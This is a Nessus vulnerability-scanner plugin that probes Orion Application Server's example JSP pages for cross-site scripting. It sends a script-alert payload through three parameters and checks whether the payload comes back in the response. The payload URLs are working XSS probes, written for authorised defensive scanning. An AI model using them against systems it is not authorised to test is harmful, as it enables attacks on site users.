#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(40985);
  script_version("$Revision: 1.1 $");

  script_name(english:"Orion Application Server Web Examples Multiple XSS");
  script_summary(english:"Tries to inject script code into several examples");

  script_set_attribute(
    attribute:"synopsis",
    value:string(
      "The remote web server includes at least one JSP application that is\n",
      "affected by a cross-site scripting vulnerability."
    )
  );
  script_set_attribute(
    attribute:"description", 
    value:string(
      "The remote web server uses Orion Application Server, an application\n",
      "server running on a Java2 platform. \n",
      "\n",
      "It currently makes available at least one example JSP application that\n",
      "fails to sanitize user-supplied input before using it to generate\n",
      "dynamic HTML output.  Specifically, the 'item' parameter of the\n",
      "'examples/jsp/sessions/carts.jsp' script, the 'fruit' parameter of\n",
      "'examples/jsp/checkbox/checkresult.jsp' script, and the 'time'\n",
      "parameter of the 'examples/jsp/cal/cal2.jsp' script are known to be\n",
      "affected.  An attacker may be able to leverage this to inject\n",
      "arbitrary HTML and script code into a user's browser to be executed\n",
      "within the security context of the affected site."
    )
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://archives.neohapsis.com/archives/bugtraq/2009-09/0038.html"
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://archives.neohapsis.com/archives/bugtraq/2009-07/0110.html"
  );
  script_set_attribute(
    attribute:"solution", 
    value:"Undeploy the web examples distributed with Orion."
  );
  script_set_attribute(
    attribute:"cvss_vector", 
    value:"CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N"
  );
  script_set_attribute(
    attribute:"vuln_publication_date", 
    value:"2009/09/07"
  );
  script_set_attribute(
    attribute:"plugin_publication_date", 
    value:"2009/09/15"
  );
  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80);

# Unless we're being paranoid, make sure the banner looks like Orion.
if (report_paranoia < 2)
{
  banner = get_http_banner(port:port);
  if (banner && "Server: Orion/" >!< banner) exit(0, "Server response header indicates it's not Orion.");
}
if (get_kb_item("www/"+port+"/generic_xss")) exit(1, "The web server itself is prone to XSS attacks.");


alert = string("<script>alert('", SCRIPT_NAME, "')</script>");
if (thorough_tests) 
{
  exploits = make_list(
    string('/examples/jsp/sessions/carts.jsp?item=', urlencode(str:"<body>"+alert+"</body>"), "&submit=add"),
    string('/examples/jsp/checkbox/checkresult.jsp?fruit=', urlencode(str:alert)),
    string('/examples/jsp/cal/cal2.jsp?time=', urlencode(str:alert))
  );
}
else
{
  exploits = make_list(
    string('/examples/jsp/sessions/carts.jsp?item=', urlencode(str:"<body>"+alert+"</body>"), "&submit=add")
  );
}


# Try to exploit the issue.
foreach exploit (exploits)
{
  res = http_send_recv3(method:"GET", item:exploit, port:port);
  if (isnull(res)) exit(1, "The web server failed to respond.");

  # There's a problem if we see our exploit in the output.
  if (
    (
      "carts.jsp" >< exploit &&
      "You have the following items in your cart:" >< res[2] &&
      string('<li> <body>', alert, '</body>') >< res[2]
    ) ||
    (
      "checkresult.jsp" >< exploit &&
      "The checked fruits" >< res[2] &&
      alert >< res[2]
    ) ||
    (
      "cal2.jsp" >< exploit &&
      string('<BR> Time ', alert, ' </h3>') >< res[2]
    )
  )
  {
    set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);

    if (report_verbosity > 0)
    {
      set_kb_item(name:'www/'+port+'/XSS', value:TRUE);

      report = string(
        "\n",
        "Nessus was able to exploit the issue using the following URL :\n",
        "\n",
        "  ", build_url(port:port, qs:exploit), "\n"
      );
      security_warning(port:port, extra:report);
    }
    else security_warning(port);

    exit(0);
  }
}
